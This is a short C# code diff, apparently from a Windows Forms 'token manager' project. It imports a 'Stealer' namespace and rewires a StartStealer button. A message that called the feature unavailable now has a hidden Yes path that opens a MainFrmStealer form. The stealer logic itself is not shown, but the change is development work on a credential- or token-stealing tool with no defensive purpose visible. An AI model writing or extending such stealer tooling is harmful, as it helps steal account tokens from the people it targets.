@@ -2,6 +2,7 @@
 using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+using Tokens.rip_Token_Manager.Stealer;
 
 namespace Tokens.rip_Token_Manager
 {
@@ -64,7 +65,13 @@ namespace Tokens.rip_Token_Manager
 
         private void StartStealer_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("Currently this feature isn't available to non-developers.");
+            if (MessageBox.Show("Currently this feature isn't available to non-developers.", "Die", MessageBoxButtons.YesNo) == DialogResult.Yes)
+            {
+                this.Hide();
+                var Stealer = new MainFrmStealer();
+                Stealer.Location = this.Location;
+                Stealer.Show();
+            }
         }
 
         private void tokens_ripLogo_Click(object sender, EventArgs e)
